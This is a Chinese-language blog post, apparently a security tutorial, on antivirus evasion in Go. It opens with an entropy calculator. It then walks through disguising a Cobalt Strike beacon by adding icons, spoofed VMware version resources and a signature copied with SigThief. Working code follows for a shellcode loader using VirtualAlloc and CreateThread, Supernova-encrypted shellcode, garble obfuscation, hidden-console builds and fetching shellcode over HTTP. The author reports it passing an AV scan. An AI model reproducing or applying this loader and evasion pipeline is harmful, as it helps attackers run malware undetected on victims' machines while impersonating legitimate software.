@@ -1,0 +1,432 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="4119cd128399fbb762c55f8350b7c313">免杀与 golang 实现</h1>
+<p>本文从二进制文件的熵值入手，探讨了免杀理论和 Golang 免杀的实现。同时，开发了两个工具，分别是 <a href="https://github.com/yutianqaq/EntropyCalc_Go" target="_blank">EntropyCalc_Go</a> ，用于计算和观察二进制程序各个部分的熵值变化，以及 <a href="https://github.com/yutianqaq/Supernova_CN" target="_blank">Supernova_CN</a> 将用于生成几种编码加密方式（CHACHA20、B64XOR、B64RC4、B64AES、B64CHACHA20）。</p>
+<p>在二进制文件中添加资源文件或图标，可以有效降低文件的熵值，使其看起来更像一个合法的应用程序。</p>
+<p>还以 Supernova 中的 chacha20 加密方式为例子，实现 Golang 版本的 Shellcode 加载器。以及在编译时添加图标、详细信息的方式。结合这两个工具和本文的方法，可以方便地生成加密的Shellcode，并生成解密的代码，结合不同的加载方式将实现有效的免杀效果。</p>
+<h1 data-content="1" id="3fb79e821bfae6cd204c9fa8829cd673">熵值</h1>
+<p>根据 <a href="https://practicalsecurityanalytics.com/file-entropy/" target="_blank">Threat Hunting with File Entropy – Practical Security Analytics LLC</a><br/>
+ 可以得到一般软件的熵值为 4.8 - 7.2 之间 ，而恶意软件熵值会大于7.2。</p>
+<p>根据 <a href="https://rosettacode.org/wiki/Entropy#Go" target="_blank">https://rosettacode.org/wiki/Entropy#Go</a> 中的计算公式，可以使用 Go 来实现熵值的计算。</p>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nx">main</span>
+
+<span class="kn">import</span> <span class="p">(</span>
+    <span class="s">"debug/pe"</span>
+    <span class="s">"flag"</span>
+    <span class="s">"fmt"</span>
+    <span class="s">"io"</span>
+    <span class="s">"log"</span>
+    <span class="s">"math"</span>
+    <span class="s">"os"</span>
+<span class="p">)</span>
+
+<span class="kd">func</span> <span class="nx">calculateEntropy</span><span class="p">(</span><span class="nx">buffer</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">)</span> <span class="kt">float64</span> <span class="p">{</span>
+    <span class="nx">l</span> <span class="o">:=</span> <span class="nb">float64</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nx">buffer</span><span class="p">))</span>
+    <span class="nx">m</span> <span class="o">:=</span> <span class="kd">map</span><span class="p">[</span><span class="kt">byte</span><span class="p">]</span><span class="kt">float64</span><span class="p">{}</span>
+    <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">b</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">buffer</span> <span class="p">{</span>
+        <span class="nx">m</span><span class="p">[</span><span class="nx">b</span><span class="p">]</span><span class="o">++</span>
+    <span class="p">}</span>
+
+    <span class="kd">var</span> <span class="nx">hm</span> <span class="kt">float64</span>
+    <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">c</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">m</span> <span class="p">{</span>
+        <span class="nx">hm</span> <span class="o">+=</span> <span class="nx">c</span> <span class="o">*</span> <span class="nx">math</span><span class="p">.</span><span class="nx">Log2</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nx">math</span><span class="p">.</span><span class="nx">Log2</span><span class="p">(</span><span class="nx">l</span><span class="p">)</span> <span class="o">-</span> <span class="nx">hm</span><span class="o">/</span><span class="nx">l</span>
+<span class="p">}</span>
+
+<span class="kd">func</span> <span class="nx">calculateFileEntropy</span><span class="p">(</span><span class="nx">filename</span> <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">fileBuffer</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nx">ReadFile</span><span class="p">(</span><span class="nx">filename</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+        <span class="nx">log</span><span class="p">.</span><span class="nx">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+    <span class="p">}</span>
+
+    <span class="nx">fileEntropy</span> <span class="o">:=</span> <span class="nx">calculateEntropy</span><span class="p">(</span><span class="nx">fileBuffer</span><span class="p">)</span>
+
+    <span class="nx">fmt</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">"Entropy of \033[36m%s \033[0m as a whole file is: "</span><span class="p">,</span> <span class="nx">filename</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="nx">fileEntropy</span> <span class="o">&gt;=</span> <span class="mf">5.6</span> <span class="o">&amp;&amp;</span> <span class="nx">fileEntropy</span> <span class="o">&lt;=</span> <span class="mf">6.8</span> <span class="p">{</span>
+        <span class="nx">fmt</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">"\033[32m%f\033[0m\n"</span><span class="p">,</span> <span class="nx">fileEntropy</span><span class="p">)</span> <span class="c1">// Green - legitimate</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="nx">fileEntropy</span> <span class="p">&gt;</span> <span class="mf">7.2</span> <span class="o">&amp;&amp;</span> <span class="nx">fileEntropy</span> <span class="o">&lt;=</span> <span class="mf">8.0</span> <span class="p">{</span>
+        <span class="nx">fmt</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">"\033[31m%f\033[0m\n"</span><span class="p">,</span> <span class="nx">fileEntropy</span><span class="p">)</span> <span class="c1">// Red - malicious</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">fmt</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">"%f\n"</span><span class="p">,</span> <span class="nx">fileEntropy</span><span class="p">)</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">func</span> <span class="nx">calculatePESectionEntropy</span><span class="p">(</span><span class="nx">filename</span> <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">file</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nx">Open</span><span class="p">(</span><span class="nx">filename</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+        <span class="nx">log</span><span class="p">.</span><span class="nx">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="k">defer</span> <span class="nx">file</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
+
+    <span class="nx">filePE</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">pe</span><span class="p">.</span><span class="nx">NewFile</span><span class="p">(</span><span class="nx">file</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+        <span class="nx">log</span><span class="p">.</span><span class="nx">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+    <span class="p">}</span>
+
+    <span class="nx">calculateFileEntropy</span><span class="p">(</span><span class="nx">filename</span><span class="p">)</span>
+
+    <span class="nx">fmt</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">"[i] Parsing \033[36m%s\033[0m 's PE Section Headers ...\n"</span><span class="p">,</span> <span class="nx">filename</span><span class="p">)</span>
+
+    <span class="nx">colorIndex</span> <span class="o">:=</span> <span class="mi">0</span>
+    <span class="nx">colors</span> <span class="o">:=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">"\033[33m"</span><span class="p">,</span> <span class="s">"\033[32m"</span><span class="p">,</span> <span class="s">"\033[36m"</span><span class="p">,</span> <span class="s">"\033[35m"</span><span class="p">,</span> <span class="s">"\033[34m"</span><span class="p">}</span>
+
+    <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">section</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">filePE</span><span class="p">.</span><span class="nx">Sections</span> <span class="p">{</span>
+        <span class="nx">sectionName</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">section</span><span class="p">.</span><span class="nx">Name</span><span class="p">[:])</span>
+        <span class="nx">sectionSize</span> <span class="o">:=</span> <span class="nx">section</span><span class="p">.</span><span class="nx">Size</span>
+
+        <span class="k">switch</span> <span class="nx">sectionName</span> <span class="p">{</span>
+        <span class="k">case</span> <span class="s">".text"</span><span class="p">,</span> <span class="s">".data"</span><span class="p">,</span> <span class="s">".rdata"</span><span class="p">,</span> <span class="s">".pdata"</span><span class="p">,</span> <span class="s">".xdata"</span><span class="p">,</span> <span class="s">".CRT"</span><span class="p">,</span> <span class="s">".rsrc"</span><span class="p">,</span> <span class="s">".reloc"</span><span class="p">:</span>
+            <span class="nx">sectionContent</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="nx">sectionSize</span><span class="p">)</span>
+            <span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">file</span><span class="p">.</span><span class="nx">Seek</span><span class="p">(</span><span class="nb">int64</span><span class="p">(</span><span class="nx">section</span><span class="p">.</span><span class="nx">Offset</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+                <span class="nx">log</span><span class="p">.</span><span class="nx">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+            <span class="p">}</span>
+            <span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">io</span><span class="p">.</span><span class="nx">ReadFull</span><span class="p">(</span><span class="nx">file</span><span class="p">,</span> <span class="nx">sectionContent</span><span class="p">)</span>
+            <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+                <span class="nx">log</span><span class="p">.</span><span class="nx">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+            <span class="p">}</span>
+
+            <span class="nx">sectionEntropy</span> <span class="o">:=</span> <span class="nx">calculateEntropy</span><span class="p">(</span><span class="nx">sectionContent</span><span class="p">)</span>
+
+            <span class="nx">color</span> <span class="o">:=</span> <span class="nx">colors</span><span class="p">[</span><span class="nx">colorIndex</span><span class="p">]</span>
+            <span class="nx">colorIndex</span> <span class="p">=</span> <span class="p">(</span><span class="nx">colorIndex</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="nx">colors</span><span class="p">)</span>
+
+            <span class="nx">fmt</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">"\t&gt;&gt;&gt; %s%s%s Scored Entropy Of Value: %f\033[0m\n"</span><span class="p">,</span> <span class="nx">color</span><span class="p">,</span> <span class="s">"\""</span><span class="o">+</span><span class="nx">sectionName</span><span class="o">+</span><span class="s">"\""</span><span class="p">,</span> <span class="nx">color</span><span class="p">,</span> <span class="nx">sectionEntropy</span><span class="p">)</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="kd">func</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">filename</span> <span class="o">:=</span> <span class="nx">flag</span><span class="p">.</span><span class="nx">String</span><span class="p">(</span><span class="s">"file"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"File to calculate entropy"</span><span class="p">)</span>
+    <span class="nx">flag</span><span class="p">.</span><span class="nx">Parse</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="o">*</span><span class="nx">filename</span> <span class="o">==</span> <span class="s">""</span> <span class="p">{</span>
+        <span class="nx">flag</span><span class="p">.</span><span class="nx">Usage</span><span class="p">()</span>
+        <span class="k">return</span>
+    <span class="p">}</span>
+
+    <span class="nx">file</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nx">Open</span><span class="p">(</span><span class="o">*</span><span class="nx">filename</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+        <span class="nx">log</span><span class="p">.</span><span class="nx">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="k">defer</span> <span class="nx">file</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
+
+    <span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">pe</span><span class="p">.</span><span class="nx">NewFile</span><span class="p">(</span><span class="nx">file</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nx">err</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
+        <span class="nx">calculatePESectionEntropy</span><span class="p">(</span><span class="o">*</span><span class="nx">filename</span><span class="p">)</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">calculateFileEntropy</span><span class="p">(</span><span class="o">*</span><span class="nx">filename</span><span class="p">)</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>从下图可以看到 Cobalt Strike 默认 beacon 熵值为 7.53。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003313-173a9d5a-c37b-1.png"/></p>
+<p>而一些合法软件的熵值在 4.8 - 7.2 之间</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003328-204e7ace-c37b-1.png"/></p>
+<blockquote>
+<p>红色为恶意，绿色为合法，白色为其他。一般二进制熵值高是因为做了压缩或加密</p>
+</blockquote>
+<p>对比程序的节，可以看到 Cobalt Strike 默认 beacon 是没有 .rsrc 节。.rsrc 节是用来存储资源文件的（包括图标、版本信息等）。</p>
+<h1 data-content="1" id="da9c1e13e3cb82177378c3ae5a4d9d97">通过添加资源降低熵值</h1>
+<h2 data-content="1" id="d7a54b7c21493dc7a1ca9bd3be5e0845">图标添加</h2>
+<p>我们可以通过添加图标信息来降低熵值。对于没有源码的程序可以使用 Resource Hacker 来添加图标。</p>
+<p><strong>最终结果</strong><br/>
+从下图可以看到在添加图标资源后多了一个 .rsrc 节，所以添加合适的图标可以降低熵值。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003339-26b074ee-c37b-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003345-2a48ea50-c37b-1.png"/></p>
+<p>还可以添加版权信息、签名来伪装成一个合法的程序。</p>
+<h2 data-content="1" id="f875a4ffe21322e76e00a517a726749c">复制签名信息</h2>
+<p>签名复制可以使用 <a href="https://github.com/secretsquirrel/SigThief" target="_blank">https://github.com/secretsquirrel/SigThief</a></p>
+<pre><code>python .\sigthief.py -i 有签名的程序 -t 你的程序 -o 输出的名字
+python .\sigthief.py -i .\vmware.exe -t .\MYRAJIGK.go.exe -o hello.exe</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003353-2f197270-c37b-1.png"/></p>
+<h2 data-content="1" id="a1ef1921cb38f511b3baf9e79116238f">添加版权信息</h2>
+<p>使用 打开 要添加版权信息的程序，点击倒数第四个图标，点击下拉框到最下面，选择 VERSION_INFO，点击 Add</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003400-333f58b0-c37b-1.png"/></p>
+<p>接着修改合适的信息，点击绿色按钮运行脚本。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003406-36ad5e66-c37b-1.png"/></p>
+<p>保存后再次打开，对应的信息已经出现在详细信息属性中。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003411-39e581ee-c37b-1.png"/></p>
+<p>经过以上几个步骤后，会发现还是会被杀。<br/>
+这是因为 Cobalt Strike 的 Shellcode 已经被各大杀软记录了特征。<br/>
+对比可执行的 EXE 与原始 Shellcode 文件，可以看到 Shellcode 部分占比较大。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003417-3d88fa10-c37b-1.png"/></p>
+<p>因此在免杀过程中处理好 Shellcode 以及敏感字符可以规避很多静态规则</p>
+<h2 data-content="1" id="3221182ad5df699fc0ec430f4a889768">Shellcode 处理</h2>
+<p>根据 ，通过对 Shellcode 进行 Base64 编码可以大大降低熵值</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003424-416159fc-c37b-1.png"/></p>
+<p>多次 Base64 编码也可以降低熵值，但随之而来的是文件增大，从原始的 399 kb 变为了 985 kb</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003430-453a14ce-c37b-1.png"/></p>
+<p>仅进行 Base64 编码不足以保护 Shellcode，因此更好的方案是对 Shellcode 做多字节异或、AES、RC4 等加密。</p>
+<p>将原始 Shellcode 加密后，可以看到熵值变大了。高熵的 Shellcode 不利于整体文件的的熵，所以套一层 Base64 会好一些。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003440-4b73a954-c37b-1.png"/></p>
+<p>加入 base64 之后的效果，降低了约 1.2，属于合法软件熵值内</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003446-4f0ee4fc-c37b-1.png"/></p>
+<p>虽然文件增大了 100kb 但这是值得的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003458-5602feb0-c37b-1.png"/></p>
+<h1 data-content="1" id="ea09613d1c55be0e2890b59578c469b4">Golang 免杀</h1>
+<blockquote>
+<p>免杀要做的是将程序的行为（静态、动态、流量）像是正常软件</p>
+</blockquote>
+<h2 data-content="1" id="c2b121ae32429c4583f8ac1b3f099dbf">执行 Shellcode</h2>
+<p>这是一种最基础的执行方式，Shellcode 没有编码、加密</p>
+<pre><code>cat loader1.go 
+package main
+
+import (
+        "unsafe"
+        "golang.org/x/sys/windows"
+)
+
+var (
+        kernel32      = windows.NewLazySystemDLL("kernel32.dll")
+        rtlCopyMemory = kernel32.NewProc("RtlCopyMemory")
+        createThread  = kernel32.NewProc("CreateThread")
+)
+
+func main() {
+        shellcode := []byte{0xfc, ...[snip]..., 0x00}
+        shellcodeExec, _ := windows.VirtualAlloc(
+                uintptr(0),
+                uintptr(len(shellcode)),
+                windows.MEM_COMMIT|windows.MEM_RESERVE,
+                windows.PAGE_READWRITE)
+
+        rtlCopyMemory.Call(
+                shellcodeExec,
+                (uintptr)(unsafe.Pointer(&amp;shellcode[0])),
+                uintptr(len(shellcode)))
+
+        var oldProtect uint32
+        windows.VirtualProtect(
+                shellcodeExec,
+                uintptr(len(shellcode)),
+                windows.PAGE_EXECUTE_READ,
+                &amp;oldProtect)
+
+        hThread, _, _ := createThread.Call(
+                0,
+                0,
+                shellcodeExec,
+                uintptr(0),
+                0,
+                0)
+
+        windows.WaitForSingleObject(
+                windows.Handle(hThread),
+                windows.INFINITE)
+
+}
+
+go mod init loader1
+
+go mod tidy        
+
+CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build</code></pre>
+<p>安装依赖，并编译后。杀软直接报毒</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003506-5ac7bf26-c37b-1.png"/><br/>
+这是因为 Shellcode 被特征了，要绕过需要对 Shellcode 做转换（编码、加密、压缩等）</p>
+<h2 data-content="1" id="1cf86e91e70a209760b74570f9a9949f">保护你的 Shellcode</h2>
+<p>为了方便的加密 Shellcode，我二开了 <a href="https://github.com/nickvourd/Supernova" target="_blank">nickvourd/Supernova: Real fucking shellcode encryption tool</a> ，为这个工具增加了 CHACHA20, B64XOR, B64RC4, B64AES, B64CHACHA20 等加密方式，增加了 Golang guide 的支持。新的工具在 <a href="https://github.com/yutianqaq/Supernova_CN" target="_blank">yutianqaq/Supernova_CN: Supernova 的中文版和扩展了一些加密方式（ROT, XOR, RC4, AES, CHACHA20, B64XOR, B64RC4, B64AES, B64CHACHA20）</a></p>
+<pre><code>./Supernova                                                                               
+
+
+███████╗██╗   ██╗██████╗ ███████╗██████╗ ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗ 
+██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗████╗  ██║██╔═══██╗██║   ██║██╔══██╗
+███████╗██║   ██║██████╔╝█████╗  ██████╔╝██╔██╗ ██║██║   ██║██║   ██║███████║
+╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╗██║██║   ██║╚██╗ ██╔╝██╔══██║
+███████║╚██████╔╝██║     ███████╗██║  ██║██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
+╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
+
+Supernova v1.0.0 - 真正的Shellcode加密器。
+Supernova是一个开源工具，受MIT许可证保护。
+由@nickvourd、@0xvm、@Papadope9和@yutianqaq用&lt;3编写...
+原版请访问https://github.com/nickvourd/Supernova了解更多信息...
+汉化版本https://github.com/yutianqaq/Supernova_CN
+
+Usage of Suprenova.exe:
+  -d    开启 Debug 模式
+  -enc string
+        Shellcode加密方式 (例如, ROT, XOR, RC4, AES, CHACHA20, B64XOR, B64RC4, B64AES, B64CHACHA20)
+  -guide
+        开启引导模式
+  -i string
+        64位原始格式 Shellcode 的路径
+  -k int
+        加密的密钥长度 (default 1)
+  -lang string
+        转换(Nim, Rust, C, CSharp, Go)格式的Shellcode
+  -o string
+        输出到文件
+  -v string
+        Shellcode 的变量名称 (default "shellcode")
+  -version
+        展示 Supernova 当前的版本</code></pre>
+<p>通过此命令可以快速生成 rc4 加密方式 Shellcode</p>
+<pre><code>./Supernova -enc rc4 -i calc.bin -k 16 -lang go -o calc_rc4.bin -guide</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003514-5f7b997a-c37b-1.png"/></p>
+<p>解密验证</p>
+<pre><code>go mod inti rc4
+go build
+./rc4                                                                 
+RC4 Decrypted Payload:
+0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, ...[snip]... 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00</code></pre>
+<h2 data-content="1" id="a020b34ddf5f4eae41e4638f7d2c28ef">武器化部分</h2>
+<p>有了加密和解密 Shellcode 的方法，现在只需将 Shellcode 解密后，复制到内存中，再通过 api 调用就好了。</p>
+<h3 data-content="1" id="d8da69e9eb35c51f0000a592d30d8272">通过 CreateThread 调用 Shellcode</h3>
+<p>使用生成解密部分的 golang 代码</p>
+<pre><code>./Supernova -enc chacha20 -i calc.bin -lang go -o calc_cc20.bin -guide</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003522-6437ff12-c37b-1.png"/></p>
+<pre><code>package main
+
+import (
+    "golang.org/x/crypto/chacha20poly1305"
+    "fmt"
+)
+
+func Chacha20Decrypt(data []byte, key []byte) ([]byte) {
+    aead, err := chacha20poly1305.NewX(key)
+
+
+    nonceSize := aead.NonceSize()
+
+    if len(data) &lt; nonceSize {
+        return nil
+    }
+
+    // Split nonce and ciphertext.
+    nonce, ciphertext := data[:nonceSize], data[nonceSize:]
+
+    // Decrypt the message and check it wasn't tampered with.
+    plaintext, err := aead.Open(nil, nonce, ciphertext, nil)
+    if err != nil {
+        if err.Error() == "chacha20poly1305: message authentication failed" {
+            return nil
+        }
+
+        return nil
+    }
+
+    return plaintext
+}
+
+
+func main() {
+    shellcode := []byte{ 0x28,...[snip]... 0x92 }
+    key := []byte { 0xfa, ...[snip]... 0xce }
+
+    decryptedShellcode := Chacha20Decrypt(shellcode, key)
+
+    fmt.Print("Chacha20 Decrypted Payload:\n")
+    for i, b := range decryptedShellcode {
+        fmt.Printf("0x%02X", b)
+        if i &lt; len(decryptedShellcode)-1 {
+            fmt.Print(", ")
+        }
+    }
+    fmt.Println()
+
+}</code></pre>
+<p>解密部分已经写好，现在只需要将加载器部分代码加入即可</p>
+<p>此时再次扫描，已经没有风险项了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003529-68872192-c37b-1.png"/></p>
+<p>更多加载方式可以参考 <a href="https://github.com/xiecat/AlternativeShellcodeExec-Go/tree/master" target="_blank">https://github.com/xiecat/AlternativeShellcodeExec-Go/tree/master</a></p>
+<h2 data-content="1" id="68f07f773aeca08275cd53d6ceb8fbe7">Golang 编译参数 - OPSEC</h2>
+<h3 data-content="1" id="3eac2e355223148a7f69ce0eb115beef">去除路径</h3>
+<p>在不添加参数的情况下，编译的程序会自带目录，例如</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003535-6c2c65be-c37b-1.png"/></p>
+<p>可以通过 <code>-trimpath</code> 参数来去除路径。效果如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003541-6f4dc364-c37b-1.png"/></p>
+<h3 data-content="1" id="8335725f773309691bb9a71bb946578a">缩小文件</h3>
+<p>通过 <code>-ldflags="-s -w"</code>，参数可以缩小编译后的文件大小</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003548-7386636e-c37b-1.png"/></p>
+<h3 data-content="1" id="18882760117836d0ecc7bc1307647776">隐藏 DOS 框</h3>
+<p>使用以下命令编译可以隐藏 DOS 黑框框</p>
+<pre><code>CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -trimpath -ldflags="-s -w -H=windowsgui"</code></pre>
+<h2 data-content="1" id="86aed94e853e476dedc4ba4a0b7dcc0f">garble</h2>
+<p>还可以使用 garble 来混淆</p>
+<pre><code>go install mvdan.cc/garble@latest
+
+CGO_ENABLED=0 GOOS=windows GOARCH=amd64  garble -seed=random build -ldflags "-s -w -H=windowsgui" -trimpath -o loader2_garble.exe</code></pre>
+<p>几个 garble 编译命令的组合</p>
+<pre><code>CGO_ENABLED=0 GOOS=windows GOARCH=amd64  garble -tiny -literals build -ldflags "-s -w -H=windowsgui" -trimpath -o loader2_garble.exe
+
+CGO_ENABLED=0 GOOS=windows GOARCH=amd64  garble -literals build -ldflags "-s -w -H=windowsgui" -trimpath -o loader2_garble.exe
+
+CGO_ENABLED=0 GOOS=windows GOARCH=amd64  garble -tiny build -ldflags "-s -w -H=windowsgui" -trimpath -o loader2_garble.exe</code></pre>
+<p>同时这个 grable 还可以用来混淆一些工具，比如 fscan 等等</p>
+<h2 data-content="1" id="bb5408772518a1276b557e3a6139b754">编译时添加图标、详细信息（伪装为合法软件）</h2>
+<p>之前是使用的 Resource Hacker 对可执行程序添加资源的方法。如果有源码，我们在编译阶段就可以添加信息。</p>
+<p>制作需要一个 icon 图标、一个 rc 文件</p>
+<p><strong>main.rc</strong><br/>
+根据情况修改后再使用</p>
+<pre><code>1 VERSIONINFO
+FILEVERSION 17,5,0,49595
+
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904B0"
+        BEGIN
+            VALUE "FileDescription", "VMware Workstation"
+            VALUE "FileVersion", "17.5.0.49595"
+            VALUE "LegalCopyright", "Copyright (C) 1998-2023 VMware, Inc."
+            VALUE "OriginalFilename", "main.exe"
+            VALUE "ProductName", "VMware Workstation"
+            VALUE "ProductVersion", "17.5.0 build-22583795"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+            VALUE "Translation", 0x0409, 0x04B0
+    END
+END
+
+1 ICON "icon1.ico"</code></pre>
+<p>编译为 syso 文件</p>
+<pre><code>└─# x86_64-w64-mingw32-windres -F pe-x86-64 main.rc -O coff -o icon.syso</code></pre>
+<p>此时再编译程序，可以看到是有图标和详细信息的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003556-78b32570-c37b-1.png"/></p>
+<p>有图标和没有图标的熵值</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003602-7bc95f18-c37b-1.png"/></p>
+<blockquote>
+<p>注：绿色数字为正常，红色为异常，白色是其他</p>
+</blockquote>
+<h2 data-content="1" id="edce25dbb718adbee2d28dbbbdbe33bb">Shellcode 不同的存储方式</h2>
+<h3 data-content="1" id="6cd9947e9f7f3ac92a611fba409a86d5">本地存储</h3>
+<p>只需要改变一行代码。运行时必须有 Shellcode 文件，可以是绝对路径或者相对的路径</p>
+<pre><code>shellcode, _ := os.ReadFile("./test2.bin")</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003608-7fc2a8fe-c37b-1.gif"/></p>
+<h2 data-content="1" id="02dd1b7f97a88284e29e991a93c03776">远程存储</h2>
+<p>需要将文件存储到远程服务器，以 python -m http.server 80 来举例<br/>
+首先引入库、增加函数</p>
+<pre><code>"github.com/valyala/fasthttp"
+
+
+func fetchShellcode() []byte {
+
+    url := "http://localhost/test.bin"
+
+    _, body, _ := fasthttp.Get(nil, url)
+
+    return body
+}</code></pre>
+<p>最后将 Shellcode 处改为函数调用</p>
+<pre><code>shellcode := fetchShellcode()</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240205003616-84395e14-c37b-1.gif"/></p>
+<p>缺点是会发起一次请求，生成的文件较大</p>
+<h1 data-content="1" id="3c120af5196122c556bc8731f3421616">总结</h1>
